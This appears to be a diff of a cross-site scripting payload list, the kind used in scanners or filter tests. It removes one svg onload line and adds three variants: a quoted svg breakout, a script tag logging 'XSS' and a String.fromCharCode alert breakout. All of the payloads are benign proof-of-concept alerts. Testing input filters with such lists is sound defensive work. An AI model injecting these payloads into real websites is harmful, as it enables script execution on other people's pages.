@@ -1,3 +1,5 @@
 <script>alert(1)</script>
 "><img src=x onerror=alert(1)>
-<svg/onload=alert(1)>
+'><svg/onload=alert(1)>
+"><script>console.log('XSS')</script>
+';alert(String.fromCharCode(88,83,83));//'
